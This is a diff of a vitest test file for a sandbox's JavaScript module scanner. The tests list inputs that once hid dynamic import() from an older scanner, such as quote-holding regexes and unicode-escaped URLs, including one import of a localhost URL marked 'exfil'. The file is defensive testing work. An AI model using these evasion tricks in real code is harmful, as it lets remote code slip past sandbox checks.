@@ -1,22 +1,36 @@
 import { describe, expect, it } from "vitest";
-import { checkPackage, maskComments, normalisePath, resolveSpecifier, scanModule } from "../src/source.ts";
+import { checkPackage, normalisePath, parseModule, resolveSpecifier, scanModule } from "../src/source.ts";
 
 describe("scanModule", () => {
   it("finds static imports and re-exports with their positions", () => {
-    const src = `import api, { model } from "sawhorse";\nimport "./side.js";\nexport { a } from './lib/a.js';\nexport * from "./b.js";\nconst s = "import x from 'nope'"; const t = \`importScripts \${"import('y')"}\`; const k = self["import" + "Scripts"];`;
+    const src = `import api, { model } from "sawhorse";\nimport "./side.js";\nexport { a } from './lib/a.js';\nexport * from "./b.js";\nexport * as c from "./c.js";\nconst s = "import x from 'nope'"; const t = \`importScripts \${"import('y')"}\`; const k = self["import" + "Scripts"];`;
     const r = scanModule("main.js", src);
     expect(r.problems).toEqual([]);
     // Text inside strings never counts as an import or a forbidden word.
-    expect(r.imports.map((i) => i.spec)).toEqual(["sawhorse", "./side.js", "./lib/a.js", "./b.js"]);
+    expect(r.imports.map((i) => i.spec)).toEqual(["sawhorse", "./side.js", "./lib/a.js", "./b.js", "./c.js"]);
     for (const i of r.imports) expect(src.slice(i.start, i.end)).toBe(i.spec);
   });
 
+  it("reads a specifier the way the module loader does (escapes resolved)", () => {
+    const src = 'import x from "\\u002e/lib/a.js";';
+    const r = scanModule("main.js", src);
+    expect(r.problems).toEqual([]);
+    expect(r.imports).toHaveLength(1);
+    expect(r.imports[0].spec).toBe("./lib/a.js");
+    // The text the sandbox replaces is everything inside the quotes.
+    expect(src.slice(r.imports[0].start, r.imports[0].end)).toBe("\\u002e/lib/a.js");
+    const hidden = scanModule("main.js", 'import x from "\\u0068ttps://example.com/x.js";');
+    expect(hidden.imports[0].spec).toBe("https://example.com/x.js");
+    expect(resolveSpecifier("main.js", hidden.imports[0].spec, {})).toHaveProperty("problem");
+  });
+
   it("refuses dynamic import and importScripts, even behind a comment", () => {
-    const r = scanModule("m.js", `const a = await import("https://x");\nimport/* sneaky */("./y.js");\nimportScripts("z.js");\nconst meta = import.meta.url;`);
-    expect(r.problems).toHaveLength(3);
+    const r = scanModule("m.js", `const a = await import("https://x");\nimport/* sneaky */("./y.js");\nimportScripts("z.js");\nconst meta = import.meta.url;\nself.importScripts("w.js");`);
+    expect(r.problems).toHaveLength(4);
     expect(r.problems[0]).toContain("m.js:1: dynamic import()");
     expect(r.problems[1]).toContain("m.js:2: dynamic import()");
     expect(r.problems[2]).toContain("m.js:3: importScripts");
+    expect(r.problems[3]).toContain("m.js:5: importScripts");
   });
 
   it("ignores what is only in comments", () => {
@@ -24,21 +38,54 @@ describe("scanModule", () => {
     expect(r.problems).toEqual([]);
     expect(r.imports).toEqual([]);
   });
-});
 
-describe("maskComments", () => {
-  it("keeps strings, regexes and templates; blanks comments; keeps positions", () => {
-    const src = 'const a = "//not a comment"; const r = /\\/\\*x/g; const t = `a${"}"}b//c`; // gone\n/* gone */ x';
-    const m = maskComments(src);
-    expect(m.length).toBe(src.length);
-    const bare = maskComments(src, true);
-    expect(bare.length).toBe(src.length);
-    expect(bare).not.toContain("not a comment");
-    expect(bare.slice(0, 11)).toBe('const a = "');
-    expect(m).toContain('"//not a comment"');
-    expect(m).toContain("/\\/\\*x/g");
-    expect(m).toContain('`a${"}"}b//c`');
-    expect(m).not.toContain("gone");
+  // The verifier's bypasses of the old text scanner (it guessed regex versus division from
+  // the previous token): a regex holding a quote or a backtick, placed where the guess was
+  // "division", opened a phantom string that swallowed the import(...) after it. Each must
+  // be found by the parser.
+  const PAYLOAD = 'import("data:text/javascript,export default 1")';
+  const bypasses: [string, string][] = [
+    ["a regex after if (...)", `if (true) /"/.test("x"); ${PAYLOAD};`],
+    ["a regex after while (...)", `let i = 0; while (i++ < 1) /'/.test("x"); ${PAYLOAD};`],
+    ["a regex after throw", `function f() { throw /"/; }\n${PAYLOAD};`],
+    ["a regex after try/throw", `try { throw /"/; } catch {}\n${PAYLOAD};`],
+    ["a regex after delete", `delete /"/.x; ${PAYLOAD};`],
+    ["a regex after export default", `export default /"/;\n${PAYLOAD};`],
+    ["a backtick regex after )", `if (1) /\`/.test(""); ${PAYLOAD};`],
+    ["a regex after a block", `{}\n/"/.test("x"); ${PAYLOAD};`],
+    ["a regex after =>", `const f = () => /"/; ${PAYLOAD};`],
+    ["a division that looks like a regex", `const a = 4, g = 2; const x = a /"/" + g; ${PAYLOAD};`],
+    ["inside a template expression", `const t = \`\${/"/.source}\${${PAYLOAD}}\`;`],
+    ["a phase import", `import.source("./x.js");`],
+    ["an http URL", `${PAYLOAD.replace("data:text/javascript,export default 1", "http://localhost:5212/@vite/env.js?exfil=1")};`],
+  ];
+  for (const [what, src] of bypasses) {
+    it(`finds import() hidden by ${what}`, () => {
+      const r = checkPackage({ "main.js": src }, "main.js");
+      expect(r.problems.length, src).toBeGreaterThan(0);
+      expect(r.problems.join("\n"), src).toMatch(/dynamic import\(\) is not allowed|import\.source is not allowed|cannot be read as a JavaScript module/);
+    });
+  }
+
+  it("the bypasses that are valid modules are refused for the import(), not for a parse error", () => {
+    for (const [, src] of bypasses.slice(0, 11)) {
+      expect(() => parseModule(src), src).not.toThrow();
+      expect(scanModule("main.js", src).problems.join("\n"), src).toContain("dynamic import() is not allowed");
+    }
+  });
+
+  it("refuses a module it cannot read, with the line", () => {
+    const r = scanModule("lib/x.js", "export const a = 1;\nconst = ;");
+    expect(r.problems).toHaveLength(1);
+    expect(r.problems[0]).toMatch(/^lib\/x\.js:2: cannot be read as a JavaScript module: /);
+    // HTML-like comments are script syntax, not module syntax: a module may not use them to
+    // hide code (a browser refuses the module too).
+    expect(scanModule("m.js", "const x = 1 <!-- import('y')\n").problems.join()).toContain("cannot be read");
+  });
+
+  it("allows import.meta, top-level await and a hashbang", () => {
+    const r = scanModule("m.js", "#!/usr/bin/env node\nconst u = import.meta.url;\nawait Promise.resolve(u);\nexport {};");
+    expect(r.problems).toEqual([]);
   });
 });
 
